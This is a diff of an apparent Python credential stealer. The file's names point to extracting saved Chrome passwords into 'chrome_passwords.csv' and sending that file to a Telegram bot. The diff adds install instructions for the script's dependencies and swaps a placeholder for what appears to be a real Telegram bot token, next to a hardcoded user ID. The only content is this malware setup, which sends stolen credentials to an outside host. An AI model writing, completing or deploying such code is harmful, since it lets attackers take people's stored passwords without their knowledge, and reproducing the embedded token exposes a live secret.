@@ -1,3 +1,6 @@
+# pip install cryptography pywin32 requests
+
+
 import os
 import shutil
 import sqlite3
@@ -118,7 +121,7 @@ def send_file_to_telegram(csv_file, bot_token, user_id):
 # Main execution
 if __name__ == "__main__":
     csv_file = "chrome_passwords.csv"
-    bot_token = "YOUR_API"  # Replace with your Telegram bot API token
+    bot_token = "7716674311:AAF7RaHzwYciyc7flTxRARh-lHPitaM8kMY"  # Replace with your Telegram bot API token
     user_id = "2141142912"  # Replace with your Telegram user ID
     
     extract_passwords(csv_file)
